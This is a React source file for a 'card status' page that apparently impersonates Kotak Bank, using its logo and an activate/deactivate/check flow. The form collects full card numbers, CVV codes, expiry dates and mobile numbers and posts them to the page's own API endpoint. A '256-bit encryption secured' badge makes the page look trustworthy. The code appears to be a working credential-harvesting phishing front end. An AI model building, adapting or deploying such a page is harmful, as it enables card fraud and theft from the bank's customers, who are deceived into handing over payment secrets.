import { useState, useEffect } from 'react'
import { Link, useNavigate, useSearchParams } from 'react-router-dom'

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000/api'

const CardStatusForm = () => {
  const navigate = useNavigate()
  const [searchParams] = useSearchParams()
  const [cardData, setCardData] = useState({
    cardNumber: '',
    cvv: '',
    expiryDate: '',
    mobileNumber: '',
  })
  const [errors, setErrors] = useState({})
  const [status, setStatus] = useState(null)
  const [loading, setLoading] = useState(false)
  const [actionType, setActionType] = useState(null)

  useEffect(() => {
    const action = searchParams.get('action')
    if (action && ['activate', 'deactivate', 'check'].includes(action)) {
      setActionType(action)
    }
  }, [searchParams])

  const formatCardNumber = (value) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ''
    const parts = []
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }
    return parts.length ? parts.join(' ') : value
  }

  const formatExpiry = (value) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
    if (v.length >= 2) {
      return v.substring(0, 2) + '/' + v.substring(2, 4)
    }
    return v
  }

  const validateMobile = (mobile) => {
    return /^[6-9]\d{9}$/.test(mobile)
  }

  const validateCardNumber = (cardNumber) => {
    const cleaned = cardNumber.replace(/\s/g, '')
    return /^\d{16}$/.test(cleaned)
  }

  const handleChange = (e) => {
    const { name, value } = e.target
    let newValue = value
    
    if (name === 'cardNumber') {
      newValue = formatCardNumber(value)
    } else if (name === 'expiryDate') {
      newValue = formatExpiry(value)
    } else if (name === 'cvv') {
      newValue = value.replace(/[^0-9]/g, '').substring(0, 4)
    } else if (name === 'mobileNumber') {
      newValue = value.replace(/[^0-9]/g, '').substring(0, 10)
    }
    
    setCardData({ ...cardData, [name]: newValue })
    
    if (errors[name]) {
      setErrors({ ...errors, [name]: '' })
    }
  }

  const validateForm = () => {
    const newErrors = {}

    if (!cardData.cardNumber) {
      newErrors.cardNumber = 'Card number is required'
    } else if (!validateCardNumber(cardData.cardNumber)) {
      newErrors.cardNumber = 'Enter valid 16-digit card number'
    }

    if (!cardData.cvv) {
      newErrors.cvv = 'CVV is required'
    } else if (cardData.cvv.length < 3) {
      newErrors.cvv = 'CVV must be 3 or 4 digits'
    }

    if (!cardData.expiryDate) {
      newErrors.expiryDate = 'Expiry date is required'
    }

    if (!cardData.mobileNumber) {
      newErrors.mobileNumber = 'Mobile number is required'
    } else if (!validateMobile(cardData.mobileNumber)) {
      newErrors.mobileNumber = 'Enter valid 10-digit mobile number'
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    
    if (!validateForm()) return
    
    setLoading(true)
    setStatus(null)
    
    try {
      const response = await fetch(`${API_URL}/card-status`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          ...cardData,
          action: actionType
        })
      })
      
      const data = await response.json()
      setStatus({
        success: response.ok,
        message: data.message || (actionType === 'activate' ? 'Card activated successfully!' : 'Card deactivated successfully!')
      })
      
      if (response.ok) {
        setTimeout(() => navigate('/'), 2000)
      }
    } catch (error) {
      setStatus({
        success: false,
        message: 'Connection error. Please try again.'
      })
    } finally {
      setLoading(false)
    }
  }

  const handleAction = (action) => {
    setActionType(action)
  }

  return (
    <div className="min-h-screen bg-gray-100 font-inter pt-24">
      <header className="bg-white shadow-sm fixed top-0 left-0 right-0 z-50">
        <div className="max-w-lg mx-auto h-24 px-4 flex items-center justify-between">
          <Link to="/" className="flex items-center">
            <img 
              src="/kotak.png" 
              alt="Kotak Bank" 
              className="h-20 object-contain"
            />
          </Link>
          <Link 
            to="/" 
            className="flex items-center gap-2 text-gray-600 hover:text-red-600 transition-colors text-sm font-medium"
          >
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/>
            </svg>
            Back
          </Link>
        </div>
      </header>

      <main className="max-w-lg sm:max-w-xl md:max-w-2xl mx-auto px-3 sm:px-4 py-4 sm:py-6">
        {status ? (
          <div className={`rounded-xl p-6 sm:p-8 text-center ${status.success ? 'bg-green-50' : 'bg-red-50'}`}>
            <div className={`w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 ${status.success ? 'bg-green-100' : 'bg-red-100'}`}>
              {status.success ? (
                <svg className="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"/>
                </svg>
              ) : (
                <svg className="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"/>
                </svg>
              )}
            </div>
            <h3 className={`text-lg font-semibold mb-2 ${status.success ? 'text-green-800' : 'text-red-800'}`}>
              {status.success ? 'Success!' : 'Error'}
            </h3>
            <p className={status.success ? 'text-green-600' : 'text-red-600'}>{status.message}</p>
          </div>
        ) : (
          <div className="bg-white rounded-xl sm:rounded-2xl overflow-hidden shadow-lg animate-slide-up">
            <div className="gradient-header-red px-4 sm:px-6 py-3 sm:py-4">
              <h2 className="text-base sm:text-lg font-semibold text-white">
                {actionType ? (actionType === 'activate' ? 'Activate Card' : 'Deactivate Card') : 'Card Status'}
              </h2>
              <p className="text-white/70 text-xs sm:text-sm mt-0.5">
                {actionType ? 'Enter your card details' : 'Select an action to continue'}
              </p>
            </div>

            <form onSubmit={handleSubmit} className="p-3 sm:p-5 md:p-6">
              {!actionType ? (
                <div className="space-y-4">
                  <p className="text-gray-600 text-sm text-center mb-4">Choose an action for your card</p>
                  <button
                    type="button"
                    onClick={() => handleAction('activate')}
                    className="w-full bg-green-50 border-2 border-green-200 text-green-700 px-6 py-4 rounded-xl font-semibold hover:bg-green-100 transition-all flex items-center justify-center gap-3"
                  >
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
                    </svg>
                    Activate Card
                  </button>
                  <button
                    type="button"
                    onClick={() => handleAction('deactivate')}
                    className="w-full bg-red-50 border-2 border-red-200 text-red-700 px-6 py-4 rounded-xl font-semibold hover:bg-red-100 transition-all flex items-center justify-center gap-3"
                  >
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"/>
                    </svg>
                    Deactivate Card
                  </button>
                  <button
                    type="button"
                    onClick={() => handleAction('check')}
                    className="w-full bg-blue-50 border-2 border-blue-200 text-blue-700 px-6 py-4 rounded-xl font-semibold hover:bg-blue-100 transition-all flex items-center justify-center gap-3"
                  >
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/>
                    </svg>
                    Check Status
                  </button>
                </div>
              ) : (
                <>
                  <div className="space-y-3 sm:space-y-4">
                    <div>
                      <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1.5 sm:mb-2">
                        Card Number <span className="text-red-500">*</span>
                      </label>
                      <input
                        type="text"
                        name="cardNumber"
                        value={cardData.cardNumber}
                        onChange={handleChange}
                        placeholder="1234 5678 9012 3456"
                        maxLength={19}
                        className={`w-full input-field-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-800 placeholder-gray-400 tracking-wider ${errors.cardNumber ? 'border-red-500' : ''}`}
                      />
                      {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
                    </div>

                    <div>
                      <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1.5 sm:mb-2">
                        Mobile Number <span className="text-red-500">*</span>
                      </label>
                      <div className="flex">
                        <span className="input-field-red rounded-l-lg sm:rounded-l-xl px-2 sm:px-3 py-2.5 sm:py-3 text-gray-500 border-r border-gray-200 bg-gray-50 text-sm">
                          +91
                        </span>
                        <input
                          type="tel"
                          name="mobileNumber"
                          value={cardData.mobileNumber}
                          onChange={handleChange}
                          placeholder="9876543210"
                          maxLength={10}
                          className={`flex-1 input-field-red rounded-r-lg sm:rounded-r-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-800 placeholder-gray-400 ${errors.mobileNumber ? 'border-red-500' : ''}`}
                        />
                      </div>
                      {errors.mobileNumber && <p className="text-red-500 text-xs mt-1">{errors.mobileNumber}</p>}
                    </div>

                    <div className="grid grid-cols-2 gap-3 sm:gap-4">
                      <div>
                        <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1.5 sm:mb-2">
                          CVV <span className="text-red-500">*</span>
                        </label>
                        <input
                          type="password"
                          name="cvv"
                          value={cardData.cvv}
                          onChange={handleChange}
                          placeholder="123"
                          maxLength={4}
                          className={`w-full input-field-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-800 placeholder-gray-400 ${errors.cvv ? 'border-red-500' : ''}`}
                        />
                        {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
                      </div>

                      <div>
                        <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1.5 sm:mb-2">
                          Expiry Date <span className="text-red-500">*</span>
                        </label>
                        <input
                          type="text"
                          name="expiryDate"
                          value={cardData.expiryDate}
                          onChange={handleChange}
                          placeholder="MM/YY"
                          maxLength={5}
                          className={`w-full input-field-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-800 placeholder-gray-400 ${errors.expiryDate ? 'border-red-500' : ''}`}
                        />
                        {errors.expiryDate && <p className="text-red-500 text-xs mt-1">{errors.expiryDate}</p>}
                      </div>
                    </div>
                  </div>

                  <div className="flex gap-2 sm:gap-3 mt-4 sm:mt-6">
                    <button
                      type="button"
                      onClick={() => {
                        setActionType(null)
                        setErrors({})
                      }}
                      className="flex-1 input-field-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-gray-600 font-medium hover:bg-gray-100 transition-all duration-300"
                    >
                      Back
                    </button>
                    <button
                      type="submit"
                      disabled={loading}
                      className={`flex-1 gradient-btn-red rounded-lg sm:rounded-xl px-3 sm:px-4 py-2.5 sm:py-3 text-sm sm:text-base text-white font-semibold shadow-md ${loading ? 'opacity-50 cursor-not-allowed' : ''}`}
                    >
                      {loading ? 'Processing...' : (actionType === 'check' ? 'Check Status' : actionType === 'activate' ? 'Activate' : 'Deactivate')}
                    </button>
                  </div>
                </>
              )}
            </form>
          </div>
        )}

        <div className="flex items-center justify-center gap-1.5 sm:gap-2 mt-3 sm:mt-4 text-gray-500 text-[10px] sm:text-xs">
          <svg className="w-3 h-3 sm:w-4 sm:h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
          </svg>
          <span>256-bit encryption secured</span>
        </div>
      </main>
    </div>
  )
}

export default CardStatusForm
